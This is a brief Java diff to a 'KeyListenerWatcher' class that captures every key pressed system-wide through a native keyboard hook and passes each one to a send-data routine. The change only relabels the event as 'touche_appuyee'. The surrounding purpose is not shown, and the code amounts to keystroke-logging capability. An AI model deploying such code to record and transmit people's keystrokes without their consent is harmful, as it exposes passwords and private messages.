@@ -22,8 +22,8 @@ public class KeyListenerWatcher extends Watcher
 	{
 		public void nativeKeyPressed(NativeKeyEvent e) {
 			//System.out.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
-			String information = "Touche : " + NativeKeyEvent.getKeyText(e.getKeyCode());
-			createDataBeforeSendEvent(information, "normal");
+			String information = NativeKeyEvent.getKeyText(e.getKeyCode());
+			createDataBeforeSendEvent("touche_appuyee", information);
 
 		}
 
